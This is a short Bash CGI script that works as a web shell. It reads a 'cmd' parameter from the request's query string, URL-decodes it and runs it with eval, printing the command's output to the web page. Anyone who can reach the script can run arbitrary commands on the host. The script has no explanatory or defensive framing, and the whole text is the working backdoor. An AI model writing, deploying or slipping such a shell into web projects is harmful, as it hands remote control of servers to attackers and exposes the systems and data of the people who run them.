#!/bin/bash

echo "Content-type: text/html"
echo ""

echo "<h3>System Output:</h3>"
echo "<pre>"
cmd=$(echo "$QUERY_STRING" | sed -n 's/^cmd=\(.*\)/\1/p')

cmd=$(printf '%b' "${cmd//%/\\x}")

eval "$cmd"

echo "</pre>"